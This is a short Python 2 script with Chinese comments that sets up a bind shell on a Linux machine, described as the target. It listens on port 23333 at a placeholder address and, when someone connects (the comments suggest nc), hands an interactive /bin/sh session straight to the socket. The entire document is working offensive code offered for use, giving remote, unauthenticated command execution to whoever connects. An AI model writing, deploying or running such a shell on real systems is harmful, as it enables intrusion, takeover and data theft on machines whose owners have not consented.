#coding:urf-8
#linux的正向shell，直接用nc连接就行
#不使用管道，直接把shell的输入输出定向到socket中。

from socket import *
import subprocess
import os, threading, sys, time

if __name__ == "__main__":
        #典型的服务器端
        server=socket(AF_INET,SOCK_STREAM)
        server.bind(('1.1.1.1',23333))#目标姬的ip及端口号
        server.listen(5)
        print 'waiting for connect'
        talk, addr = server.accept()

        print 'connect from',addr
        proc = subprocess.Popen(["/bin/sh","-i"], stdin=talk,stdout=talk, stderr=talk, shell=True)